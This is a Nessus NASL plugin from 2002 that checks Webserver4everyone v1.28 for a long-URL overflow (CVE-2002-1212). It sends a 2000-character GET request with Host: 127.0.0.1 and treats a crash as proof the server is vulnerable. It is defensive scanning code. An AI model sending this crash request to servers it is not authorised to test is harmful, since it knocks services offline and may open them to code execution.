#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
# Some vulnerable servers:
# WebServer 4 Everyone v1.28
#
#
########################
# References:
########################
# From:"Tamer Sahin" <ts@securityoffice.net>
# To:bugtraq@securityfocus.com
# Subject: [SecurityOffice] Web Server 4 Everyone v1.28 Host Field Denial of Service Vulnerability
#
########################

if(description)
{
 script_id(11167);
 script_bugtraq_id(5967);
 script_cve_id("CVE-2002-1212");
 script_version ("$Revision: 1.13 $");
 
 name["english"] = "Webserver4everyone too long URL";
 name["francais"] = "URL trop longue dans Webserver4everyone";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It may be possible to make Webserver4everyone execute
arbitrary code by sending it a too long url with 
the Host: field set to 127.0.0.1

Risk factor : High

Solution : Upgrade your web server.";

 desc["francais"] = "
Il serait possible de faire exécuter du code arbitraire
à Webserver4everyone en lui envoyant une URL trop 
longue avec le champ Host: à 127.0.0.1

Facteur de risque : Elevé

Solution : Mettez à jour votre serveur web.";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Webserver4everyone too long URL with Host field set";
 summary["francais"] = "Débordement mémoire dans Webserver4everyone avec le champ Host";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "www_too_long_url.nasl", "http_version.nasl");
 script_require_ports("Services/www",80);
 script_exclude_keys("www/too_long_url_crash");
 script_require_keys("www/webserver4everyone");
 exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

if(safe_checks())
{ 
  b = get_http_banner(port: port);
  if (egrep(string: b, pattern: "WebServer 4 Everyone/1\.([01][0-9]?|2[0-8])"))
    security_hole(port);
  exit(0);
}

if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);

req = string("GET /", crap(2000), " HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n");
send(socket:soc, data:req);
http_close_socket(soc);

if(http_is_dead(port: port))
{
  security_hole(port);
  set_kb_item(name:"www/too_long_url_crash", value:TRUE);
}
